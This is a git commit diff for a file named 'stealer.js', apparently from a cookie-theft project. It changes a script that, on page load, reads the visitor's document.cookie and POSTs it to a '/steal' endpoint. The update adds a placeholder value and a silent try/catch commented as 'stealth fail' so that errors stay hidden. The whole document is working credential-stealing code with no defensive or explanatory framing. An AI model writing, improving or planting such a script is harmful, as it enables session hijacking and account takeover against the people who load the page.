99808c8dde1d1a3f7f653ac1f73dda400127dd1c
MR5121472 <177574924+MR5121472@users.noreply.github.com>
2025-06-20 04:00:55 +0500

    Update stealer.js

--- static/stealer.js
+++ static/stealer.js
@@ -1,8 +1,12 @@
-window.onload = function() {
-  let cookies = document.cookie;
-  fetch("/steal", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "cookie=" + encodeURIComponent(cookies)
-  });
+window.onload = function () {
+  try {
+    let cookies = document.cookie || "NO_COOKIES_FOUND";
+    fetch("/steal", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "cookie=" + encodeURIComponent(cookies)
+    });
+  } catch (e) {
+    // Do nothing - stealth fail
+  }
 };
